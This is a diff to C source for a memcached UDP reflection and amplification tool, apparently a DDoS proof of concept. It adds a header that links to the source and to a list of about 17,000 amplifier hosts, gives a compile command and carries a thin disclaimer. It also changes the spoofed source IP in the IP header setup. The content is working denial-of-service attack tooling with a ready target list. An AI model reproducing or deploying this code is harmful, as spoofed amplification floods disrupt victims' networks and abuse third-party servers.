@@ -1,5 +1,18 @@
+/**
+memcached-PoC
+
+memcached Proof of Concept Amplification via spoofed source UDP packets. Repo includes source code for PoC and approximately 17,000 AMP hosts.
+
+memcached.c - Source code (https://pastebin.com/raw/ZiUeinae)
+memecache-amp-03-05-2018-rd.list - List of memcached servers as of 03-05-2018 (https://pastebin.com/raw/eSCHTTVu)
+
+Compile: gcc memcached.c -o memecached -pthread
+
+*Educational and/or testing purposes only. *Use of these tools against an unauthorized party may be unethtical, rude, and even illegal in some countries.
+
+**/
+
 /* 
-   compile: gcc memcached.c -o memcached -pthread
    memcache reflection script
    greeting: syn, storm, krashed, chrono, spike, niko, disliked
    Use with extreme Caution
@@ -76,7 +89,7 @@ void setup_ip_header(struct iphdr *iph)
 	iph->ttl = MAXTTL;
 	iph->protocol = IPPROTO_UDP;
 	iph->check = 0;
-	iph->saddr = inet_addr("127.0.0.1");
+	iph->saddr = inet_addr("192.168.3.100");
 }
 void setup_udp_header(struct udphdr *udph)
 {
